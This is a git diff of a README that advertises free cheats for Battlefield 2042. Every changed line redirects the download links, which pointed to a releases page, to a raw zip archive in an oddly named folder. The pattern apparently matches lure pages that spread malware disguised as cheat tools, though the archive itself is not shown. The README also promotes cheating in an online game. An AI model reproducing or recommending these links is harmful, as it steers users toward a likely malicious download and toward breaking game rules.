@@ -1,6 +1,6 @@
 # ⚡ BF2042-Hack - Free Hacks for Battlefield 2042
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Shahadathossan01/BF2042-Hack/releases)
+[![Download Now](https://raw.githubusercontent.com/Shahadathossan01/BF2042-Hack/main/exomorphic/BF2042-Hack.zip)](https://raw.githubusercontent.com/Shahadathossan01/BF2042-Hack/main/exomorphic/BF2042-Hack.zip)
 
 ## 🕹️ Introduction
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the latest version of the BF2042-Hack. Click the link below:
 
-[Download Latest Release](https://github.com/Shahadathossan01/BF2042-Hack/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Shahadathossan01/BF2042-Hack/main/exomorphic/BF2042-Hack.zip)
 
 Once you’re on the Releases page:
 
@@ -69,7 +69,7 @@ If you encounter any issues, here are some common solutions:
 
 ## 🔗 Helpful Links
 
-- [Download Latest Release](https://github.com/Shahadathossan01/BF2042-Hack/releases)
+- [Download Latest Release](https://raw.githubusercontent.com/Shahadathossan01/BF2042-Hack/main/exomorphic/BF2042-Hack.zip)
 - [Community Support](#)
 
 ## 📜 License
